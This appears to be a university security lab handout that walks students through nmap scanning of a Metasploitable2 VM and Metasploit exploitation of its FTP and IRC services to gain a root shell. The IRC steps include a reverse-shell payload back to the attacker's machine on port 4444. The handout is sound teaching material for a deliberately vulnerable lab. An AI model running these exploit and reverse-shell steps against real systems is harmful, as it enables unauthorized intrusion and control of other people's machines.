# ACIT 4630 – Lab 2 – Vulnerability Scanning

## Instructions: 
We are going to use the Kali VM and the Metaploitable2 VM we created in the previous lab. 

An attacker or a pen tester goes through the reconnaissance phase first to look at the overall environment, identify specific targets, and focus on target enumeration. 

### Scanning Vulnerability using OpenVAS
to be editted!!!

### Host discovery and scanning using nmap 
- (Q1) What is the purpose of the -sn option in nmap? 
- (Q2) In the previous lab, you used nmap to find what services are running on what ports in the Metasploitable2 VM. Which nmap option gives you the version of those services? why is it important for vulnerability scanning? 
- (Q3) Try scanning Metasploitable2 VM from your Kali machine using -A option with nmap. What additional information about the open ports on Metasploitable2 VM can you get by using this option?

### Exploring Vulnerabilities 
After we complete enumerating (retrieving and collecting services, usernames, computers, ... on a network) Metasploitable 2, we need to look for known vulnerabilities for operating systems and services running on this machine. Do the following steps
for **ftp (on port 21)** and irc services running on Metasploitable 2: 
- From your previous nmap results (Services with their version), find the software and the version for the service and Google this info to see if this specific version of the software has any known vulnerabilities. 
-	Nmap has a comprehensive library of scripts that provide many advanced capabilities. Find and use nmap with a [script](https://nmap.org/nsedoc/scripts/) that scans a target for a vulnerable version of these softwares. 
    - Hint: use --script option 
    - Hint: You should provide the port the service is running on
- (Q4) What vulnerabilities did you find – both from Google and using the script? 

### Instructions for Exploiting FTP Port on Metasploitable2 Using Kali Linux
**Objective:** Gain root access to a shell on the target endpoint (Metasploitable2).
**Requirements:** Both Kali Linux and Metasploitable2 are on the same NAT Network.
#### Scan the Target with Nmap
1.	Open a terminal on your Kali Linux machine.
2.	Use Nmap to discover open ports, services, and their versions on Metasploitable2:
```sh
nmap -sV [TARGET_IP]
```
#### Open Metasploit Framework
1.	Launch Metasploit Framework by typing:
```sh
msfconsole
```
### Exploit the FTP Service
1.	Search for the FTP exploit module based on the service version found in the Nmap scan:
```sh
search ftp/[VERSION]
```
Replace [VERSION] with the version number identified by Nmap.

2.	Select the appropriate FTP module:
```sh
use [EXPLOIT_PATH]
```
Replace [EXPLOIT_PATH] with the path of the chosen exploit.
3.	Set the RHOSTS option to the target IP:
```sh
set RHOSTS [TARGET_IP]
```
4.	Run the exploit:
```sh
exploit
```
5.	If successful, you will gain access to the shell. To verify, run:
```sh
whoami
```
6. Check the shell type and IP:
```sh
echo $0
ifconfig
```

### Instructions for Exploiting IRC Port on Metasploitable2 Using Kali Linux

#### Exploit the IRC Service
1.	Search for the IRC exploit module based on the service version:
```sh
search irc [VERSION]
```
Replace [VERSION] with the version number identified by Nmap.
2.	Select the appropriate IRC module:
```sh
use [EXPLOIT_PATH]
```
3.	Set the necessary options:
```sh
set RHOSTS [TARGET_IP]
set RPORT [IRC_PORT]
set LHOST [YOUR_IP]
set LPORT 4444
```
Replace [IRC_PORT] with the port number of the IRC service, [YOUR_IP] with your Kali machine IP, and 4444 is recommended local port for this exploit.
4.	Set the payload: you can see all the payloads by show payloads command.
```sh
set PAYLOAD cmd/unix/reverse
```
Replace [PAYLOAD_NAME] with the appropriate payload for the exploit.
5.	Run the exploit:
```sh
exploit
```
6.	Verify access by running:
```sh
whoami
echo $0
ifconfig
```

(Q5) Explain 3 above commands and their results.
Ensure each step is completed accurately to gain root access. If any step fails, review configurations or try different modules/payloads suited to the service versions found.


### Submission For Lab 2: 
- Create a report answering the questions in the lab above. 
- Add screenshots of exploit command and result of commands to verify the access (3 above and last commands); for each exploit (FTP and IRC)
- Submit your report to the Learning Hub in PDF format. 
